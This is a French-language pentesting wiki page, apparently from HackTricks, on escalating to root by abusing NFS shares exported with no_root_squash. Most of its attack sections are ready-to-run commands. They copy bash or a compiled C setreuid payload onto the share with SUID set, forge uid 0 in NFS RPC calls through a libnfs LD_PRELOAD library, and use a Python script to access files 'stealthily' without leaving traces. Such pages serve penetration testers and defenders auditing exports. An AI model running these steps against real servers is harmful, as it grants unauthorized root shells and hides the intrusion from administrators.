{{#include ../../banners/hacktricks-training.md}}

# Informations de base sur le Squashing

NFS fera généralement (surtout sous Linux) confiance au `uid` et `gid` indiqués par le client se connectant pour accéder aux fichiers (si Kerberos n'est pas utilisé). Cependant, il existe certaines configurations qui peuvent être définies sur le serveur pour **changer ce comportement** :

- **`all_squash`** : Cela écrase tous les accès en mappant chaque utilisateur et groupe à **`nobody`** (65534 non signé / -2 signé). Par conséquent, tout le monde est `nobody` et aucun utilisateur n'est utilisé.
- **`root_squash`/`no_all_squash`** : C'est la valeur par défaut sur Linux et **n'écrase que l'accès avec uid 0 (root)**. Par conséquent, tout `UID` et `GID` sont de confiance, mais `0` est écrasé à `nobody` (donc aucune usurpation de root n'est possible).
- **``no_root_squash`** : Cette configuration, si elle est activée, n'écrase même pas l'utilisateur root. Cela signifie que si vous montez un répertoire avec cette configuration, vous pouvez y accéder en tant que root.

Dans le fichier **/etc/exports**, si vous trouvez un répertoire configuré comme **no_root_squash**, alors vous pouvez **y accéder** en tant que **client** et **écrire à l'intérieur** de ce répertoire **comme** si vous étiez le **root** local de la machine.

Pour plus d'informations sur **NFS**, consultez :

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

# Escalade de privilèges

## Exploit à distance

Option 1 utilisant bash :
- **Monter ce répertoire** sur une machine cliente, et **en tant que root copier** à l'intérieur du dossier monté le binaire **/bin/bash** et lui donner des droits **SUID**, puis **exécuter depuis la machine victime** ce binaire bash.
- Notez que pour être root à l'intérieur du partage NFS, **`no_root_squash`** doit être configuré sur le serveur.
- Cependant, s'il n'est pas activé, vous pourriez escalader vers un autre utilisateur en copiant le binaire dans le partage NFS et en lui donnant la permission SUID en tant qu'utilisateur vers lequel vous souhaitez escalader.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2 utilisant du code compilé en C :
- **Monter ce répertoire** sur une machine cliente, et **en tant que root copier** à l'intérieur du dossier monté notre charge utile compilée qui abusent des permissions SUID, lui donner des droits **SUID**, et **exécuter depuis la machine victime** ce binaire (vous pouvez trouver ici quelques [C SUID payloads](payloads-to-execute.md#c)).
- Même restrictions qu'auparavant
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Local Exploit

> [!NOTE]
> Notez que si vous pouvez créer un **tunnel de votre machine à la machine victime, vous pouvez toujours utiliser la version distante pour exploiter cette élévation de privilèges en tunnelant les ports requis**.\
> Le truc suivant est dans le cas où le fichier `/etc/exports` **indique une IP**. Dans ce cas, vous **ne pourrez pas utiliser** en aucun cas l'**exploitation distante** et vous devrez **abuser de ce truc**.\
> Une autre exigence requise pour que l'exploitation fonctionne est que **l'exportation à l'intérieur de `/etc/export`** **doit utiliser le drapeau `insecure`**.\
> --_Je ne suis pas sûr que si `/etc/export` indique une adresse IP, ce truc fonctionnera_--

## Basic Information

Le scénario implique l'exploitation d'un partage NFS monté sur une machine locale, tirant parti d'un défaut dans la spécification NFSv3 qui permet au client de spécifier son uid/gid, ce qui peut permettre un accès non autorisé. L'exploitation implique l'utilisation de [libnfs](https://github.com/sahlberg/libnfs), une bibliothèque qui permet de forger des appels RPC NFS.

### Compiling the Library

Les étapes de compilation de la bibliothèque peuvent nécessiter des ajustements en fonction de la version du noyau. Dans ce cas spécifique, les appels système fallocate ont été commentés. Le processus de compilation implique les commandes suivantes :
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Réalisation de l'Exploitation

L'exploitation consiste à créer un simple programme C (`pwn.c`) qui élève les privilèges à root et exécute ensuite un shell. Le programme est compilé, et le binaire résultant (`a.out`) est placé sur le partage avec suid root, en utilisant `ld_nfs.so` pour falsifier l'uid dans les appels RPC :

1. **Compiler le code d'exploitation :**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Placez l'exploit sur le partage et modifiez ses permissions en falsifiant l'uid :**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Exécutez l'exploit pour obtenir des privilèges root :**
```bash
/mnt/share/a.out
#root
```
## Bonus : NFShell pour un accès furtif aux fichiers

Une fois l'accès root obtenu, pour interagir avec le partage NFS sans changer de propriétaire (pour éviter de laisser des traces), un script Python (nfsh.py) est utilisé. Ce script ajuste l'uid pour correspondre à celui du fichier accédé, permettant d'interagir avec les fichiers sur le partage sans problèmes de permission :
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Exécuter comme :
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
